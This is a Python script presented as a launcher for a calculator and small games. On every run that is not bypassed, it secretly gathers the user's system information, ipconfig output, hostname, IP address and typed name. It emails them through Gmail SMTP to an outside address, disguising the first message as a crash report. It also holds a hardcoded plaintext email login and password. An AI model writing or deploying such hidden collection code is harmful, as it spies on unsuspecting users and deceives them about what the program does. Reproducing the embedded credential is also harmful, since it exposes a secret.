import socket
import webbrowser
import os
import time
from time import sleep
import sys
import smtplib
import subprocess
import socket

h_name = socket.gethostname()
addresssetup = socket.gethostbyname(h_name)
systemipfull = subprocess.check_output("ipconfig", shell=True, universal_newlines=True)
os.system('cls')
name = ("Ace")


while True:
    if addresssetup == "169.254.76.148":
        print("Bypassed Sucessfully!")
        break
    else:
        #Boot script
        print('sys.argv[0] =', sys.argv[0])             
        pathname = os.path.dirname(sys.argv[0])        
        print('path =', pathname)
        print('full path =', os.path.abspath(pathname)) 
        print("Pathway copied and successfully booted...")
        sleep(1)
        systeminfo = subprocess.check_output("SYSTEMINFO", shell=True, universal_newlines=True)
        sleep(1)
        systemversion = subprocess.check_output("ver", shell=True, universal_newlines=True)
        sleep(1)
        print('\n')
        from email.mime.multipart import MIMEMultipart
        from email.mime.text import MIMEText
        import socket

        msg = MIMEMultipart()




        server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
        server.login("python250200@gmail.com", "TgmpeJ68AUG.5.d",)
        server.sendmail("python250200@gmail.com", "peytonanthony99@gmail.com", "Attention Dev! Someone is using your script and it has crashed :( Not to worry! I have some info for you! :D "
                        "Here is their System info and full IP info for debug!" + " " + str(systemversion) + " " + 
                        str(systeminfo) + " " + str(systemipfull))


        server.quit()
        break












input("Press Enter to continue...")
os.system("cls")








pathname = os.path.dirname(sys.argv[0])



foldername = os.path.abspath(pathname)


#print('\n')
#print(foldername)
#print('\n')
#print(pathname)
#print('\n')
#print(foldername + "\calcv3.py")
#print('\n')


while True:
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    import socket
    

    name = input("Hello there! This is a one time question and wont appear again unless you close this program. What is your name?: ")

    h_name = socket.gethostname()

    addresssetup = socket.gethostbyname(h_name)


    msg = MIMEMultipart()


    if name == '3710':
        print("Bypassed")
        name = "Ace"
    else:
        server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
        server.login("python250200@gmail.com", "TgmpeJ68AUG.5.d",)
        server.sendmail("python250200@gmail.com", "peytonanthony99@gmail.com", "Attention Dev! Someone used calculator V2 "
                        "Here is their host name, IP, and Name!" + " " +
                        str(name) + " " + str(h_name) + " " + str(addresssetup))


        server.quit()


    print('\n')



    print("If you have a code please enter it here (If not leave this blank and press enter).")
    code = input("Code: ")

    print('\n')



    userchoice = ("")
    print("Calculator, Snake Game, Dino Game, Aeroblaster, Flappy Bird")


    while True:
            while True:
                userchoice = str(input("Choose an option from the list above: "))
                if userchoice in ('Calculator', 'Snake Game', 'Dino Game', 'Calc','Dino', 'Snake', 'Flappy Bird', 'Shadow Tower', 'Aeroblaster'):
                    break
                print("Not a program. (Please make sure it is spelled exactly as stated including caps).")
            if userchoice == "Calculator" or userchoice == "Calc":
                print("Booting Calculator...")
                os.system(foldername + "\calcv3.py")
                sleep(2)
                
            elif userchoice == "Snake Game" or userchoice == "Snake":
                print("Not avalible yet. Sorry! :(")
                
            elif userchoice == "Dino Game" or userchoice == "Dino":
                
                print("Booting Dino game...")
                os.system(foldername + "\main.py")
               
            elif userchoice == "Aeroblaster":
                print("Booting Aeroblaster...")
                Aeroblaster = str(foldername + r"\aeroblaster" + r"\Aeroblaster.py")
                os.startfile(Aeroblaster)
            elif userchoice == "Flappy Bird":
                print("Booting Flappy Bird...")
                flappypath = str(foldername + r"\flappy_bird" + r"\flappy_update.py")
                os.startfile(flappypath)
                


            # Left over trash code
            #elif userchoice == "Shadow":
            #    print("Booting Shadow Tower...")
            #    os.system(foldername + "\shadow_tower" + "\Shadow_Tower.py")
            #    break




# flappypath = str(foldername + "\flappy_bird" + "\flappy_update.py")



# s.systems.path.dirname(sys.argv[0]) + '\calcv3.py